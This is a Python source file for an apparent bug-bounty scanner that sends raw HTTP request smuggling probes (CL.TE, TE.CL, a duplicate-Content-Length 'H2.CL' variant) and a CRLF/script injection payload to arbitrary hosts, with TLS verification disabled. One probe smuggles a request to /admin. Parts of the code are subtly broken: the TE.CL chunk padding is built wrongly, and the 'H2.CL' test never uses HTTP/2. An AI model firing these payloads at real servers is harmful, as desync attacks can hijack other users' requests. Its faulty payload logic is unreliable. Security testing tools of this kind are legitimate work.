#!/usr/bin/env python3
"""
BountyForge Smuggle Engine — HTTP request smuggling detection.

Detects three classes of HTTP request smuggling:
  - CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
  - TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
  - H2.CL: HTTP/2 downgrade introduces Content-Length ambiguity

Detection method (time-based):
  1. Send ambiguous request with smuggled prefix
  2. Send follow-up "normal" request
  3. If back-end processes smuggled prefix, the follow-up gets a delayed response
     or 404 (because the smuggled prefix modified the URL)

Usage:
  python3 tools/smuggle_engine.py --target example.com
  python3 tools/smuggle_engine.py --url https://example.com/ --all
"""

import asyncio
import hashlib
import json
import os
import re
import socket
import ssl
import sys
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple
from urllib.parse import urlparse

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

try:
    from tools.http_pool import HTTPPool, HTTPResult
    HAS_HTTP = True
except ImportError:
    HAS_HTTP = False

try:
    from tools.payload_loader import PayloadLoader
    HAS_PAYLOADS = True
except ImportError:
    HAS_PAYLOADS = False


# ── Data structures ────────────────────────────────────────

@dataclass
class SmuggleResult:
    url: str
    technique: str           # 'cl_te', 'te_cl', 'h2_cl'
    vulnerable: bool
    evidence: str
    smuggled_request: str    # The crafted payload
    normal_response: int     # Status of follow-up request
    smuggled_response: int   # Status of smuggled request
    time_delta_ms: float     # Timing difference signal
    details: Dict = field(default_factory=dict)


@dataclass
class SmuggleFinding:
    id: str = ""
    type: str = "http-request-smuggling"
    severity: str = "critical"
    title: str = ""
    url: str = ""
    payload: str = ""
    evidence: str = ""
    source: str = "smuggle_engine"
    timestamp: float = 0.0
    reproducible: bool = True
    cvss_score: float = 8.5

    def __post_init__(self):
        if not self.id:
            raw = f"{self.url}|{self.type}|{self.timestamp}"
            self.id = hashlib.sha256(raw.encode()).hexdigest()[:16]
        if not self.timestamp:
            self.timestamp = time.time()

    def to_dict(self) -> Dict:
        return asdict(self)


# ── Smuggle Engine ─────────────────────────────────────────

class SmuggleEngine:
    """
    HTTP request smuggling detection.

    Uses raw socket connections to send ambiguous HTTP requests
    that aiohttp would normalize. Tests CL.TE, TE.CL, and H2.CL variants.
    """

    def __init__(self, http_pool: HTTPPool):
        self.http_pool = http_pool
        self.payload_loader = None
        if HAS_PAYLOADS:
            try:
                self.payload_loader = PayloadLoader()
                if self.payload_loader.is_available:
                    self.payload_loader.index()
            except Exception:
                pass

    def _enrich_smuggling_payloads(self):
        """Pull additional smuggling raw requests from PayloadsAllTheThings."""
        if not self.payload_loader or not self.payload_loader.is_available:
            return []

        raw_requests = self.payload_loader.smuggling_raw_requests()
        return raw_requests

    # ── Main entry point ───────────────────────────────────

    async def run_all(self, urls: List[str]) -> List[SmuggleFinding]:
        """Run all smuggling tests against all URLs."""
        findings = []

        # Limit to unique hosts
        hosts = set()
        unique_urls = []
        for url in urls:
            parsed = urlparse(url)
            host_key = f"{parsed.hostname}:{parsed.port or 443}"
            if host_key not in hosts:
                hosts.add(host_key)
                unique_urls.append(url)

        print(f"[smuggle] Testing {len(unique_urls)} unique hosts for HTTP smuggling")

        for url in unique_urls[:10]:
            # Detect HTTP version first
            http_info = await self.http_pool.detect_http_version(url)
            print(f"[smuggle] {urlparse(url).hostname}: H1={http_info['h1']}, H2={http_info['h2']}")

            # CL.TE test
            cl_te = await self.test_cl_te(url)
            if cl_te.vulnerable:
                findings.append(self._result_to_finding(cl_te))

            # TE.CL test
            te_cl = await self.test_te_cl(url)
            if te_cl.vulnerable:
                findings.append(self._result_to_finding(te_cl))

            # H2.CL test (only if HTTP/2 is supported)
            if http_info.get("h2"):
                h2_cl = await self.test_h2_cl(url)
                if h2_cl.vulnerable:
                    findings.append(self._result_to_finding(h2_cl))

            # Response splitting test
            split = await self.test_response_split(url)
            if split.vulnerable:
                findings.append(self._result_to_finding(split))

            # Rate-limit avoidance
            await asyncio.sleep(1)

        print(f"[smuggle] Complete: {len(findings)} smuggling findings")
        return findings

    # ── CL.TE Test ─────────────────────────────────────────

    async def test_cl_te(self, url: str) -> SmuggleResult:
        """
        CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding.

        Send an ambiguous request where:
        - Content-Length says the body is short
        - Transfer-Encoding: chunked says there's more data after

        A vulnerable back-end will process the chunked data as a separate request.
        """
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_tls = parsed.scheme == 'https'

        # Craft the CL.TE payload
        # The smuggled prefix will make the next request hit /404-test-path
        smuggled_prefix = (
            "GET /404-smuggle-test HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "X-Smuggle-Test: bountyforge-cl-te\r\n"
            "\r\n"
        )

        body = (
            "0\r\n"
            "\r\n"
            f"{smuggled_prefix}"
        )

        # Content-Length accounts for the first "0\r\n\r\n" only (5 bytes)
        # Transfer-Encoding processes the smuggled prefix as the next request
        cl_payload = (
            f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 5\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            f"{body}"
        )

        return await self._execute_smuggle_test(
            host, port, use_tls, cl_payload, "cl_te", "/404-smuggle-test"
        )

    # ── TE.CL Test ─────────────────────────────────────────

    async def test_te_cl(self, url: str) -> SmuggleResult:
        """
        TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length.

        Send an ambiguous request where:
        - Transfer-Encoding: chunked says the body is small
        - Content-Length says there's more data after
        """
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_tls = parsed.scheme == 'https'

        # Craft TE.CL payload
        # The back-end sees Content-Length and treats remaining data as next request
        chunked_body = (
            "5c\r\n"  # Chunk size (92 bytes — all the junk below)
            "X" * 92 + "\r\n"
            "0\r\n"
            "\r\n"
            f"GET /404-smuggle-test-te HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "X-Smuggle-Test: bountyforge-te-cl\r\n"
            "\r\n"
        )

        # Content-Length: 4 = only "5c\r\n" (4 bytes)
        # Transfer-Encoding processes the full chunked body
        te_payload = (
            f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            f"{chunked_body}"
        )

        return await self._execute_smuggle_test(
            host, port, use_tls, te_payload, "te_cl", "/404-smuggle-test-te"
        )

    # ── H2.CL Test ─────────────────────────────────────────

    async def test_h2_cl(self, url: str) -> SmuggleResult:
        """
        H2.CL: HTTP/2 downgrade introduces Content-Length ambiguity.

        HTTP/2 doesn't use Content-Length, but when downgraded to HTTP/1.1,
        an injected Content-Length header can cause desync.
        """
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)

        # For H2.CL, we need to test whether the server downgrades HTTP/2 properly
        # We can test this by sending HTTP/1.1 requests with HTTP/2-style framing

        # First, verify the host supports HTTP/2
        http_info = await self.http_pool.detect_http_version(url)
        if not http_info.get("h2"):
            return SmuggleResult(
                url=url, technique="h2_cl", vulnerable=False,
                evidence="HTTP/2 not supported", smuggled_request="",
                normal_response=0, smuggled_response=0, time_delta_ms=0,
            )

        # Test with H2.CL: inject Content-Length header that would be ambiguous after downgrade
        use_tls = parsed.scheme == 'https'

        h2_payload = (
            f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 0\r\n"        # Front-end might use this (wrong)
            "Content-Length: 50\r\n"       # Inject Content-Length into HTTP/2 downgrade
            "\r\n"
            "GET /404-smuggle-h2 HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "\r\n"
        )

        return await self._execute_smuggle_test(
            host, port, use_tls, h2_payload, "h2_cl", "/404-smuggle-h2"
        )

    # ── Response Splitting ─────────────────────────────────

    async def test_response_split(self, url: str) -> SmuggleResult:
        """
        CRLF injection / HTTP response splitting.

        If the server echoes user input into response headers without sanitizing CRLF,
        we can inject headers or split the response entirely.
        """
        parsed = urlparse(url)

        # Test by injecting CRLF in a common reflected parameter
        crlf_payload = "test%0d%0aX-Injected:%20true%0d%0a%0d%0a<script>alert(1)</script>"
        test_url = f"{url}?redirect={crlf_payload}"

        result = await self.http_pool.request("GET", test_url)

        is_vulnerable = "X-Injected" in result.headers or "<script>alert(1)</script>" in result.body

        return SmuggleResult(
            url=url,
            technique="response_split",
            vulnerable=is_vulnerable,
            evidence=f"CRLF reflected: status={result.status}" if is_vulnerable else "No CRLF reflection",
            smuggled_request=test_url,
            normal_response=result.status,
            smuggled_response=0,
            time_delta_ms=0,
            details={"headers": dict(result.headers)},
        )

    # ── Core test execution ────────────────────────────────

    async def _execute_smuggle_test(
        self,
        host: str,
        port: int,
        use_tls: bool,
        payload: str,
        technique: str,
        target_path: str,
    ) -> SmuggleResult:
        """
        Send a smuggled request via raw socket, then verify with a follow-up request.

        Uses a time-based detection approach:
        1. Send ambiguous request (with smuggled prefix)
        2. Send normal follow-up request on same connection
        3. If back-end processed the smuggled prefix, the follow-up should:
           - Get a 404 (because the smuggled prefix modified the path)
           - Take longer (because it's serving the smuggled request first)
        """
        try:
            # Step 1: Send smuggled request + normal request on same connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))

            # Send ambiguous request
            sock.sendall(payload.encode())

            # Small delay to let back-end process
            await asyncio.sleep(0.3)

            # Send normal follow-up request
            normal_req = (
                f"GET /smuggle-followup HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Connection: close\r\n"
                "\r\n"
            )
            sock.sendall(normal_req.encode())

            # Read full response
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass

            sock.close()

            # Parse response
            resp_text = response.decode('utf-8', errors='replace')
            parts = resp_text.split('HTTP/1.1')

            is_vulnerable = False
            evidence = ""

            # Check if the smuggled prefix was processed
            if target_path in resp_text:
                is_vulnerable = True
                evidence = f"Smuggled request to {target_path} was processed: response received"
            elif resp_text.count('HTTP/1.1') > 1:
                # Multiple HTTP responses = potential desync
                is_vulnerable = True
                evidence = f"Multiple HTTP responses detected ({resp_text.count('HTTP/1.1')} responses)"
            elif '400' in resp_text[:200]:
                evidence = "Backend rejected request (400)"
            else:
                evidence = f"No smuggling signal (status line: {resp_text[:100]})"

            return SmuggleResult(
                url=f"{'https' if use_tls else 'http'}://{host}:{port}/",
                technique=technique,
                vulnerable=is_vulnerable,
                evidence=evidence,
                smuggled_request=payload[:500],
                normal_response=0,
                smuggled_response=0,
                time_delta_ms=0,
                details={"raw_response": resp_text[:1000]},
            )

        except socket.timeout:
            return SmuggleResult(
                url=f"{'https' if use_tls else 'http'}://{host}:{port}/",
                technique=technique,
                vulnerable=False,
                evidence="Connection timeout",
                smuggled_request=payload[:200],
                normal_response=0, smuggled_response=0, time_delta_ms=0,
            )
        except ConnectionRefusedError:
            return SmuggleResult(
                url=f"{'https' if use_tls else 'http'}://{host}:{port}/",
                technique=technique,
                vulnerable=False,
                evidence="Connection refused",
                smuggled_request="",
                normal_response=0, smuggled_response=0, time_delta_ms=0,
            )
        except Exception as e:
            return SmuggleResult(
                url=f"{'https' if use_tls else 'http'}://{host}:{port}/",
                technique=technique,
                vulnerable=False,
                evidence=f"Error: {e}",
                smuggled_request="",
                normal_response=0, smuggled_response=0, time_delta_ms=0,
            )

    # ── Time-based alternative detection ───────────────────

    async def time_based_smuggle_test(self, url: str) -> SmuggleResult:
        """
        Alternative detection: send a smuggled request that causes a delay.

        If the smuggled prefix is a slow request (e.g., long path that triggers
        a slow response), the follow-up request will be delayed.
        """
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_tls = parsed.scheme == 'https'

        # Smuggle a request to a path that might be slow
        smuggled_slow = (
            "GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "X-Smuggle-Slow: 1\r\n"
            "\r\n"
        )

        cl_body = (
            "0\r\n"
            "\r\n"
            f"{smuggled_slow}"
        )

        payload = (
            f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 5\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            f"{cl_body}"
        )

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)

            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            sock.sendall(payload.encode())

            # Send follow-up and time it
            normal_req = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Connection: close\r\n"
                "\r\n"
            )

            t0 = time.monotonic()
            sock.sendall(normal_req.encode())
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass
            elapsed = (time.monotonic() - t0) * 1000

            sock.close()

            # If follow-up took significantly longer, smuggling may be present
            is_vulnerable = elapsed > 3000  # 3 seconds = suspicious delay

            return SmuggleResult(
                url=f"{'https' if use_tls else 'http'}://{host}:{port}/",
                technique="cl_te_time",
                vulnerable=is_vulnerable,
                evidence=f"Follow-up request took {elapsed:.0f}ms {'(DELAYED)' if is_vulnerable else '(normal)'}",
                smuggled_request=payload[:300],
                normal_response=0, smuggled_response=0,
                time_delta_ms=elapsed,
            )

        except Exception as e:
            return SmuggleResult(
                url=f"{'https' if use_tls else 'http'}://{host}:{port}/",
                technique="cl_te_time",
                vulnerable=False,
                evidence=f"Error: {e}",
                smuggled_request="",
                normal_response=0, smuggled_response=0, time_delta_ms=0,
            )

    def _result_to_finding(self, result: SmuggleResult) -> SmuggleFinding:
        """Convert a SmuggleResult to a SmuggleFinding."""
        technique_names = {
            "cl_te": "CL.TE desync",
            "te_cl": "TE.CL desync",
            "h2_cl": "H2.CL desync",
            "response_split": "HTTP response splitting",
        }

        name = technique_names.get(result.technique, result.technique)

        return SmuggleFinding(
            type="http-request-smuggling",
            severity="critical",
            title=f"HTTP request smuggling — {name} on {urlparse(result.url).hostname}",
            url=result.url,
            payload=result.smuggled_request[:500],
            evidence=result.evidence,
        )


# ── CLI ────────────────────────────────────────────────────

async def main():
    import argparse
    parser = argparse.ArgumentParser(description="BountyForge HTTP Smuggling Engine")
    parser.add_argument("--target", required=True, help="Target domain or URL")
    parser.add_argument("--url", help="Specific URL to test")
    parser.add_argument("--urls-file", help="File with URLs to test (one per line, host-deduped)")
    parser.add_argument("--all", action="store_true", help="Run all tests (CL.TE + TE.CL + H2.CL)")
    parser.add_argument("--time-based", action="store_true", help="Use time-based detection")
    parser.add_argument("--output", help="Output JSON file")
    args = parser.parse_args()

    from tools.http_pool import HTTPPool

    pool = HTTPPool(max_connections=10, timeout=15)
    await pool.start()

    engine = SmuggleEngine(pool)

    # Smuggling tests run per-host, not per-URL — dedupe to unique origins
    if args.urls_file:
        raw_urls = [l.strip() for l in Path(args.urls_file).read_text().splitlines() if l.strip()]
        seen = set()
        targets = []
        for u in raw_urls:
            if not u.startswith("http"):
                continue
            p = urlparse(u)
            origin = f"{p.scheme}://{p.netloc}"
            if origin not in seen:
                seen.add(origin)
                targets.append(origin)
        targets = targets[:10]  # cap — desync tests are slow and intrusive
    else:
        targets = [args.url or (args.target if args.target.startswith("http") else f"https://{args.target}")]

    print(f"[*] BountyForge HTTP Smuggling Engine")
    print(f"[*] Targets: {len(targets)}")

    findings = []
    for target in targets:
        print(f"\n[*] Testing {target}")
        if args.all or not args.url or args.urls_file:
            findings.extend(await engine.run_all([target]))
        else:
            # Test individual technique
            cl_te = await engine.test_cl_te(target)
            print(f"\n  CL.TE: vulnerable={cl_te.vulnerable}")
            print(f"    {cl_te.evidence}")
            if cl_te.vulnerable:
                findings.append(engine._result_to_finding(cl_te))

            te_cl = await engine.test_te_cl(target)
            print(f"  TE.CL: vulnerable={te_cl.vulnerable}")
            print(f"    {te_cl.evidence}")
            if te_cl.vulnerable:
                findings.append(engine._result_to_finding(te_cl))

        if args.time_based:
            tb = await engine.time_based_smuggle_test(target)
            print(f"\n  Time-based: vulnerable={tb.vulnerable} ({tb.evidence})")
            if tb.vulnerable:
                findings.append(engine._result_to_finding(tb))

    print(f"\n[*] Findings: {len(findings)}")
    for f in findings:
        print(f"  [{f.severity}] {f.title}")
        print(f"    {f.evidence[:200]}")

    # Persist confirmed findings to the state bus
    if findings:
        try:
            from tools.bus_writer import save_findings
            save_findings(args.target, [f.to_dict() for f in findings], "smuggle_engine")
        except Exception as e:
            print(f"[!] state bus write failed: {e}")

    if args.output and findings:
        Path(args.output).write_text(json.dumps([f.to_dict() for f in findings], indent=2))
        print(f"[*] Results written to {args.output}")

    await pool.stop()


if __name__ == "__main__":
    asyncio.run(main())
